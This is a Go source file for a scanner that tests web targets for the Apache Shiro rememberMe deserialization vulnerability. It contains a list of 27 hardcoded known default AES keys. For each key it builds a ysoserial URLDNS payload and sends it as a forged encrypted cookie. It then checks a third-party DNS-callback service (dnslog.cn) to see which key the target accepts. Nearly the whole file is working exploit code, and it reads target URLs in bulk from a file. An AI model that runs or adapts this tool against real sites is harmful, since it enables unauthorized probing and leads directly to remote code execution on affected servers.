package shiro
import (
	"github.com/satori/go.uuid"
	"encoding/base64"
	"crypto/cipher"
	"encoding/json"
	"crypto/aes"
	"crypto/tls"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os/exec"
	"strings"
	"strconv"
	"regexp"
	"bytes"
	"time"
	"fmt"
)

var keys = [...]string {
	"kPH+bIxk5D2deZiIxcaaaA==",
	"4AvVhmFLUs0KTA3Kprsdag==",
	"OETiR8hLkmLskvSMsKTA3A==",
	"FL9HL9Yu5bVUJ0PDU1ySvg==",
	"yxXOhbN3gf5DqGvSAa1vjw==",
	"Jtw+fIxleMF7MoT8i665Pw==",
	"Z3VucwAAAAAAAAAAAAAAAA==",
	"2AvVhdsgUs0FSA3SDFAdag==",
	"wGiHplamyXlVB11UXWol8g==",
	"3AvVhmFLUs0KTA3Kprsdag==",
	"U3ByaW5nQmxhZGUAAAAAAA==",
	"6ZmI6I2j5Y+R5aSn5ZOlAA==",
	"fCq+/xW488hMTCD+cmJ3aQ==",
	"1QWLxg+NYmxraMoxAXu/Iw==",
	"ZUdsaGJuSmxibVI2ZHc9PQ==",
	"L7RioUULEFhRyxM7a2R/Yg==",
	"r0e3c16IdVkouZgk1TKVMg==",
	"5aaC5qKm5oqA5pyvAAAAAA==",
	"bWluZS1hc3NldC1rZXk6QQ==",
	"a2VlcE9uR29pbmdBbmRGaQ==",
	"WcfHGU25gNnTxTlmJMeSpw==",
	"FP7qKJzdJ0GkzoQzo2wTmA==",
	"0Y//C4rhfwNxCQAQCrQQlQ==",
	"MTIzNDU2Nzg5MGFiY2RlZg==",
	"7AvVhmFLUsOKTA3Kprsdag==",
	"bWluZSlhc3NldClrZXk6QQ==",
	"UGlzMjAxNiVLeUVlXiEjLw==",
}

func PKCS5Padding(ciphertext []byte, blockSize int) []byte {
    padding := blockSize - len(ciphertext)%blockSize
    padtext := bytes.Repeat([]byte{byte(padding)}, padding)
    return append(ciphertext, padtext...)
}

func Request(url string, cookies string) (header string, body []byte) {
	client := &http.Client{}
	client.Transport = &http.Transport{
        TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
    }

	req, _ := http.NewRequest("GET", url ,nil)
	req.Header.Set("Cookie", cookies)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("request err: ", err)
		return "", nil
	}
	defer resp.Body.Close()

	header = fmt.Sprint(resp.Header["Set-Cookie"])
	body, _ = ioutil.ReadAll(resp.Body)

	return header, body
}

func IsShiro(url string) bool {
	header, _ := Request(url, "rememberMe=111")
	
	re, err := regexp.Compile(`rememberMe=deleteMe;`)
	if err != nil {
		fmt.Println("regexp compile error. ", err)
		return false
	}
	if (re.MatchString(header)) {
		return true
	}
	return false
}

func GetDomain (Rcookie string) []byte {
	_, domain := Request("http://www.dnslog.cn/getdomain.php", Rcookie)
	return domain
}

func GetRecords (Rcookie string) [][]string {
	_, jsonStr := Request("http://www.dnslog.cn/getrecords.php", Rcookie)
	dat := [][]string{}
	err := json.Unmarshal([]byte(jsonStr), &dat)
	if err != nil {
		fmt.Println("json trans error. ", err)
		return nil
	}
	return dat
}

func EncodeRememberme(domain string, key []byte) string {
	url := fmt.Sprint("http://", domain, "/")
	payload, _ := exec.Command("java", "-jar" , "ysoserial-master.jar", "URLDNS", url).Output()

	block, _ := aes.NewCipher(key)
	content := PKCS5Padding(payload, block.BlockSize())
	crypted := make([]byte, len(content))
	uuid := uuid.Must(uuid.NewV4()).Bytes()
	blockMode := cipher.NewCBCEncrypter(block, uuid)
	blockMode.CryptBlocks(crypted, content)

	buffer := bytes.NewBuffer(nil)
	buffer.Write(uuid)
	buffer.Write(crypted)

	cookie := base64.StdEncoding.EncodeToString(buffer.Bytes())

	return cookie
}

func GetKeys() [][]byte {
	rawKeys := [][]byte{}

	for _, key := range keys {
		raw, err := base64.StdEncoding.DecodeString(key)
		if err != nil {
			fmt.Println("regexp compile error. ", err)
			return nil
		}
		rawKeys = append(rawKeys,raw)
	}
	return rawKeys
}

func Poc(url string, intChan chan int) {
	
	
	if IsShiro(url) {
		Rcookie := fmt.Sprint("PHPSESSID=", GetRandomString(26))
		domain := GetDomain(Rcookie)
		akeys := GetKeys()
		for i, key := range akeys {
			kDomain := fmt.Sprintf("%0d.%s", i, string(domain))
			cookie := fmt.Sprint("rememberMe=", EncodeRememberme(kDomain, key))
			_, _ = Request(url, cookie)
		}
		records := GetRecords(Rcookie)
		lenrec := len(records)
		if lenrec > 0 {
			record := records[lenrec-1][0]
			var i int
			if record[1] == '.' {
				i, _ = strconv.Atoi(string(record[0]))
			}else{
				i, _ = strconv.Atoi(record)
			}
			fmt.Println("\n=====", url, "=====\n", url, "have shiro unserialize, key is", string(keys[i]))
			goto tag
		}
	}
	fmt.Println("\n=====", url, "=====\n", url, "don't have shiro unserialize")
	tag:
	if intChan != nil{
		intChan <- 1
	}
	return 
}

func ReadFile(file string) []string {
	content, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Println("read file err=",err)
	}
	urls := strings.Fields(string(content))
	return urls
}

func  GetRandomString(l int) string {
	str := "0123456789abcdefghijklmnopqrstuvwxyz"
	bytes := []byte(str)
	result := []byte{}
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < l; i++ {
		result = append(result, bytes[r.Intn(len(bytes))])
	}
	return string(result)
}
